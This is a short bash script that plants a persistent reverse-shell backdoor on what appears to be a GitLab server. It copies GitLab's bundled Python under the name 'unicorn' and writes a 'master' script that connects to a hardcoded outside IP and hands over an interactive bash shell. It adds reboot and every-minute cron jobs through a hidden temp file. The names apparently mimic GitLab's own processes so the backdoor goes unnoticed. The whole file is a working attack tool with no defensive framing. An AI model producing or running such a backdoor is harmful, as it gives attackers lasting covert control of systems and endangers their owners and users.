#!/bin/bash

echo "[+] Enter your listener port number:"
read PORT

echo "[+] Enter the directory should be stored:"
read TARGET_DIR

LISTENER_IP="172.105.118.102"

cd "$TARGET_DIR" || exit 1

# 1. Copy python to name: unicorn
cp /opt/gitlab/embedded/bin/python3 unicorn
chmod +x unicorn

# 2. Create python script named: master (NO .py, NO shebang)
cat << EOF > master
import socket, subprocess, os, time

while True:
    try:
        s = socket.socket()
        s.connect(("${LISTENER_IP}", ${PORT}))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/bash","-i"])
    except:
        time.sleep(60)
EOF

chmod +x master

# 3. Write cron that runs EXACTLY: unicorn master
crontab -l 2>/dev/null > /tmp/.fonts || true

echo "@reboot export PATH=.:\$PATH; cd $TARGET_DIR; unicorn master >/dev/null 2>&1" >> /tmp/.fonts
echo "* * * * * export PATH=.:\$PATH; cd $TARGET_DIR; unicorn master >/dev/null 2>&1" >> /tmp/.fonts

crontab /tmp/.fonts
rm /tmp/.fonts

echo "[+] Done."
